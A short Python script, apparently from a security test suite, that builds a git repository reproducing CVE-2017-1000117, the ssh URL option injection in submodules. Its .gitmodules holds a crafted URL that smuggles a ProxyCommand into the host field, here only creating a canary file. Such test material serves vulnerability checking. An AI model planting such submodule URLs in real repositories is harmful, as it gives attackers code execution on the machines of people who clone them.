"""E5: CVE-2017-1000117 — ssh URL command injection in submodule.

A submodule URL beginning with ``ssh://-oProxyCommand=...`` made git's
ssh wrapper treat the host part as an option flag, executing the
attacker's command. Patched in git ≥ 2.13.5.
"""

from __future__ import annotations

import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))
from _payload_lib import build_minimal_repo, config_with  # noqa: E402

GITMODULES = (
    b'[submodule "evil"]\n'
    b'\tpath = sub\n'
    b'\turl = ssh://-oProxyCommand=touch /canary/PWNED_E5/x.example.com/sub.git\n'
)


def main() -> None:
    build_minimal_repo(
        HERE / 'payload',
        config=config_with(''),
        tree_entries=[
            (0o100644, '.gitmodules', GITMODULES),
        ],
    )
    print(f'Built E5 payload at {HERE / "payload"}')


if __name__ == '__main__':
    main()
